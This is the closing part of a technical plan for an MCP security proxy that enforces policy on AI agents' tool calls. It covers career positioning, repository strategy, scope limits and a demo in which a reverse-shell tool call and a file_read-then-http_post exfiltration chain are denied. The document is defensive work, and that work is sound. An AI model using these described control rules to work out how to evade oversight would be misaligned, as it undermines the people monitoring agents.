- **Cross-domain expertise**: Combined protocol-level security (MCP JSON-RPC), application security (argument validation, chain detection), data security (redaction), and systems security (audit logging, approval workflows).
- **Pragmatic engineering**: Chose Go over C/C++ for v1 based on delivery velocity vs. security posture analysis, demonstrating senior engineering judgment.

Narrative: *"I built an MCP security proxy in Go that enforces deterministic policy at the MCP protocol layer. It implements allowlists, denylists, argument validation, tool-chain detection, secret redaction, human-in-the-loop approval, and structured audit logging. The architecture is fail-closed and deterministically evaluated without LLM involvement."*

### For Principal Security Engineer Roles

Position this project as:
- **Security architecture from first principles**: Started from the problem (AI agents + enterprise tools = risk), analyzed threats (STRIDE), designed controls, and implemented them.
- **Defense-in-depth design**: Multiple independent enforcement layers (allowlist, argument validation, chain detection, redaction, approval) that degrade gracefully.
- **Systems thinking**: Understood that the evaluator (offline analysis) and visor (runtime enforcement) are different security functions and designed clean separation between them.

Narrative: *"I designed and built a deterministic policy enforcement proxy for the MCP protocol, providing runtime protection against prompt injection, data exfiltration, tool abuse, and secret leakage in AI agent workflows. The system uses a multi-layer policy evaluation pipeline with tool-chain detection and human-in-the-loop approval for high-risk operations."*

### For AI Security Roles

Position this project as:
- **AI-specific security engineering**: Focused on the unique threats of AI agents — prompt injection resistance through deterministic enforcement, tool chain detection, and identity-based access control for AI identities.
- **Practical AI security**: Not theoretical. Built a working tool that intercepts real MCP protocol traffic and enforces policy in real time.
- **Complementary to ML security**: While many focus on model security (adversarial examples, model extraction), this focuses on the agent-tool interface — a growing attack surface as agents gain more capabilities.

Narrative: *"I created a runtime control plane for AI agent tool execution, addressing the gap between LLM security evaluation and actual enforcement. The system provides deterministic, non-AI policy decisions that cannot be bypassed by prompt injection."*

### For AppSec / Detection Engineering Roles

Position this project as:
- **Detection engineering for a new protocol**: Created audit logging and chain detection for MCP — a protocol that previously had no standard security monitoring.
- **Runtime application self-protection (RASP) for MCP**: The visor acts as a RASP-like layer for tool execution.
- **Structured audit pipeline**: Every tool call produces a redacted, structured audit event suitable for SIEM ingestion.

Narrative: *"I built a detection and enforcement layer for MCP tool execution, including structured audit logging with redacted secrets, real-time chain detection for data exfiltration patterns, and approval workflows for high-risk operations."*

### For Zero Trust / Infrastructure Security Roles

Position this project as:
- **Zero-trust extension to AI agents**: Applies zero-trust principles (never trust, always verify) to MCP tool access. Every call is authenticated against policy.
- **Least privilege enforcement**: Identity-based policies ensure each agent has only the minimum tool access needed.
- **Continuous verification**: Every tool call is independently verified, not just at session start.

Narrative: *"I extended zero-trust architecture principles to AI agent tool access, implementing per-call policy verification, identity-based access controls, and continuous monitoring for MCP tool execution."*

---

## 15. Final Recommendation

### Should This Be a Separate Repo or Part of the Evaluator?

**Strong recommendation: Separate repository.**

Reasons:
1. **Different audiences.** The evaluator is for security testers and compliance teams. The visor is for platform engineers, DevOps, and SRE teams running AI agents in production.
2. **Different lifecycles.** The evaluator is a Python project with LLM SDK dependencies. The visor is a Go project with protocol-level dependencies. Combining them creates dependency hell.
3. **Different threat models.** The evaluator needs API keys and talks to LLMs. The visor must never talk to an LLM and must not have API keys. Co-location is a security anti-pattern.
4. **Different deployment models.** The evaluator runs occasionally (CI, on-demand). The visor runs continuously (every tool call). Different ops requirements.
5. **Clean conceptual separation.** "Tells you what can go wrong" vs. "Stops it at runtime." Mixing them dilutes both messages.
6. **Independent open-source communities.** Each project can develop its own contributor base, plugin ecosystem, and roadmap.
7. **Portfolio clarity.** Two well-scoped, distinct projects tell a better story than one monolithic project that tries to do everything.

However, cross-link them prominently:
- Evaluator README: "For runtime enforcement of these findings, see mcp-visor."
- Visor README: "To evaluate what policies you need, see mcp-llm-security-evaluator."
- Consider a shared GitHub organization or topic tag.

### What Should Be Built First?

1. **Phase 1 (Basic Proxy):** Get the MCP protocol proxy working. This is the foundation. Everything else builds on it. This also validates the Go/MCP integration assumptions.

2. **Phase 2 (Policy Engine):** The core value proposition. Without a policy engine, it's just a proxy. This is where the differentiation happens.

3. **Phases 3-5 (Audit, Chains, Redaction):** The features that make it production-credible. Build them in parallel if possible.

4. **Phase 7 (Demo):** Build the demo early — it will drive the UX and reveal gaps in the design. Consider building a minimal demo alongside Phase 2.

### What Should Be Explicitly Avoided?

1. **Do not build reporting dashboards.** That's the evaluator's job. The visor produces logs, not reports.

2. **Do not integrate with any specific LLM.** The visor does not call LLMs. It enforces policy on tool calls.

3. **Do not claim it's "unbreachable" or "absolute security."** Be honest about limitations. Trust is earned through transparency, not marketing claims.

4. **Do not try to solve every MCP security problem in v1.** Ship a focused, working tool. Expand later.

5. **Do not write kernel code or eBPF probes in v1.** The protocol-level proxy is valuable on its own. Deeper enforcement is a future roadmap, not v1 scope.

6. **Do not duplicate evaluator features.** No LLM testing, no redaction accuracy scoring, no report generation, no provider comparison.

7. **Do not over-engineer the policy format.** YAML with reasonable features. Not a custom DSL, not a Lua/Python scripting engine. Keep it declarative.

8. **Do not build a SaaS product.** v1 is a single-binary tool for local or small-team deployment. Multi-tenancy and cloud hosting are not in scope.

### What Should Be the First Public Demo?

**The first public demo should be a 3-minute terminal recording showing:**

1. **Setup (30 seconds):** Clone repo, `go install`, start the proxy with the built-in demo server.

2. **Normal operation (30 seconds):** Show an agent calling `file_read` on an allowed path — ALLOWED. Show the audit log event.

3. **Blocked operation (30 seconds):** Show an agent calling `shell_exec` with a reverse shell command — DENIED. Show the policy rule that blocked it.

4. **Chain detection (45 seconds):** Show an agent calling `file_read` followed by `http_post` — second call DENIED due to chain detection. Show the chain rule.

5. **Approval (30 seconds):** Show the agent calling `slack_send_message` — APPROVAL REQUIRED. Demonstrate the approver accepting it. Call proceeds.

6. **Redaction (45 seconds):** Show the agent reading a config file containing `password=SuperSecret123`. Output returned with `password=[REDACTED]`.

This demo tells the complete story without requiring the viewer to understand MCP internals, Go, or policy syntax. It demonstrates all five core features (allow, deny, chain detection, approval, redaction) in a tight, comprehensible sequence.

---

*End of technical plan. This document serves as the authoritative source for PLAN.md. Subsequent documents (ROADMAP.md, GitHub issues, architecture docs) should derive from this plan.*
